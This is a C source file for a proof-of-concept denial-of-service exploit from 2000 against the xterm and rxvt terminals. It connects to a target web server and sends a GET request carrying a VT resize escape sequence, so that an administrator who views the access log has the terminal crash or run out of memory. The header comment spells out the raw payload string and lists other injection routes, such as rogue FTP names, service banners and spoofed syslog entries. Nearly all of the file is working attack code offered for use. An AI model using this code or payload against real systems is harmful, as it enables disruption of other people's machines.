/*
 *
 * xterm Denial of Service Attack
 * (C) 2000 Kit Knox <kit@rootshell.com> - 5/31/2000
 *
 * Tested against: xterm (XFree86 3.3.3.1b(88b)  -- crashes
 *                 rxvt v2.6.1 -- consumes all available memory and then
 *                                crashes.
 *
 * Not vulnerable: KDE konsole 0.9.11
 *                 Secure CRT 3.0.x
 *
 *
 * By sending the VT control characters to resize a window it is possible
 * to cause an xterm to crash and in some cases consume all available
 * memory.
 *
 * This itself isn't much of a problem, except that remote users can inject
 * these control characters into your xterm numerous ways including :
 *
 * o Directories and filenames on a rogue FTP servers.
 * o Rogue banner messages on ftp, telnet, mud daemons.
 * o Log files (spoofed syslog messages, web server logs, ftp server logs)
 *
 * This sample exploit injects these control characters into a web get
 * request.  If an admin were to cat this log file, or happened to be doing
 * a "tail -f access_log" at the time of attack they would find their
 * xterm crash.
 *
 * Embedding "ESCAPE[4;65535;65535t" (where escape is the escape character)
 * inside files, directories, etc will have the same effect as this code.
 *
 */

#include <stdio.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

int sock;

int
main (int argc, char *argv[])
{
  struct hostent *he;
  struct sockaddr_in sa;
  char buf[1024];
  char packet[1024];
  int i;

  fprintf(stderr, "[ http://www.rootshell.com/ ] - xterm DoS attack - 05/31/2000.\n\n");
  if (argc != 2)
    {
      fprintf (stderr, "usage: %s <host/ip>\n", argv[0]);
      return (-1);
    }

  sock = socket (AF_INET, SOCK_STREAM, 0);
  sa.sin_family = AF_INET;
  sa.sin_port = htons (80);
  he = gethostbyname (argv[1]);
  if (!he)
    {
      if ((sa.sin_addr.s_addr = inet_addr (argv[1])) == INADDR_NONE)
	return (-1);
    }
  else
    {
      bcopy (he->h_addr, (struct in_addr *) &sa.sin_addr, he->h_length);
    }
  if (connect (sock, (struct sockaddr *) &sa, sizeof (sa)) < 0)
    {
      fprintf (stderr,
	       "Fatal Error: Can't connect to web server.\n");
      return (-1);
    }
  sprintf(packet, "GET /\033[4;65535;65535t HTTP/1.0\n\n");
  write (sock, packet, strlen(packet));
  close (sock);
  fprintf(stderr, "Done.\n");
}


